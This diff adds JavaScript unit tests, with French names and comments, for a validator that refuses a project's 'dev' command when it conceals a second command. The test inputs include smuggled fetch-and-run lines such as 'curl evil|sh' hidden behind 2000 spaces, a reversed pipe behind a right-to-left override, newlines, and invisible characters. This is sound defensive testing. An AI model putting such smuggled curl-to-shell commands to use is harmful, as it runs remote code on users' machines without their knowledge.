@@ -181,3 +181,22 @@ test('devALancer refuse une ligne dev qui en cache une autre', async () => {
   const dir = projetAvecDev('pnpm dev\ncurl x | sh')
   assert.equal(await devALancer(dir, () => assert.fail('aucune question attendue')), null)
 })
+
+test('une commande dev à caractère invisible n’est jamais proposée à l’accord (T-0273)', () => {
+  // La modale native l'afficherait tronquée ou retournée, et un saut de ligne
+  // lance une commande de plus dans le shell du crawl comme dans un pty.
+  const invisibles = ['\u200b', '\u200e', '\u2060', '\ufeff', '\u00ad', '\u3164', '\u034f', '\u00a0', '\u{e0049}']
+  const bourrage = 'pnpm dev' + ' '.repeat(2000) + '; curl evil|sh'
+  const pieges = ['pnpm dev\ncurl x|sh', 'pnpm dev\u202e hs|x lruc', 'pnpm dev\u2028x', 'a\x9bb', 'a\x1b[2Kb', bourrage]
+  for (const dev of [...pieges, ...invisibles.map(c => `pnpm${c} dev`)]) {
+    const dir = projetAvecDev(dev)
+    assert.equal(devSurDisque(dir), null, JSON.stringify(dev))
+    assert.equal(accordRequis(dir), false)
+  }
+})
+
+test('une commande dev ordinaire reste proposée', () => {
+  for (const dev of ['pnpm dev', 'npm run dev -- --port 3000', 'PORT=4000 yarn start', 'cd app && pnpm dev']) {
+    assert.equal(devSurDisque(projetAvecDev(dev)), dev)
+  }
+})
